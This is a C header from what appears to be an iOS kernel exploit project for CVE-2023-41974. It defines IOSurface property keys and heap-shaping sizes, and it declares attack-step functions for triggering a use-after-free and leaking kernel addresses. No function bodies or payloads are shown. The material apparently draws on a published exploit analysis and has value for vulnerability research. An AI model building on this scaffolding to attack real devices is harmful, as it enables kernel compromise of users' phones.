/*
 * coruna_iosurface.h — IOSurface attack surface for CVE-2023-41974
 *
 * From NadSec analysis of dump.bin (Parallax kernel exploit):
 *   "The exploit loads the IOSurface framework dynamically,
 *    creates a matching dictionary via IOServiceMatching("IOSurfaceRoot"),
 *    opens a connection with IOServiceOpen, then triggers the
 *    vulnerability through IOConnectCallMethod/IOConnectTrap6."
 *
 * The kIOSurfaceIsGlobal, kIOSurfaceWidth, kIOSurfaceHeight property
 * keys are used to construct the IOSurface creation dictionary -
 * these set up a surface with specific dimensions, likely to control
 * the kernel heap allocation size for heap shaping.
 */
#ifndef CORUNA_IOSURFACE_H
#define CORUNA_IOSURFACE_H

#include <stdint.h>
#include <stdbool.h>
#include <coruna/coruna_driver.h>

/* IOSurface property keys (CFString) */
#define CORUNA_IOSURFACE_KEY_GLOBAL    "kIOSurfaceIsGlobal"
#define CORUNA_IOSURFACE_KEY_WIDTH     "kIOSurfaceWidth"
#define CORUNA_IOSURFACE_KEY_HEIGHT    "kIOSurfaceHeight"
#define CORUNA_IOSURFACE_KEY_BYTES_PER_ROW "kIOSurfaceBytesPerRow"
#define CORUNA_IOSURFACE_KEY_ALLOC_SIZE  "kIOSurfaceAllocSize"
#define CORUNA_IOSURFACE_KEY_PIXEL_FORMAT "kIOSurfacePixelFormat"
#define CORUNA_IOSURFACE_KEY_Y_COVER  "kIOSurfaceYCbCrMatrix"

/* IOSurface pixel formats */
#define CORUNA_IOSURFACE_FORMAT kCMPixelFormat_32BGRA
#define CORUNA_IOSURFACE_BYTES_PER_PIXEL 4

/* Heap shaping parameters */
#define CORUNA_IOSURFACE_DEFAULT_WIDTH  0x1000
#define CORUNA_IOSURFACE_DEFAULT_HEIGHT 0x1000

/* Attack steps */
int coruna_iosurface_dlopen(void **handle);
int coruna_iosurface_get_root(int *connection);
int coruna_iosurface_create(coruna_iosurface_t *io, uint32_t width, uint32_t height);
int coruna_iosurface_trigger_uaf(int connection, uint32_t surface_id);
int coruna_iosurface_leak(int connection, uint32_t *kaddr);

#endif /* CORUNA_IOSURFACE_H */
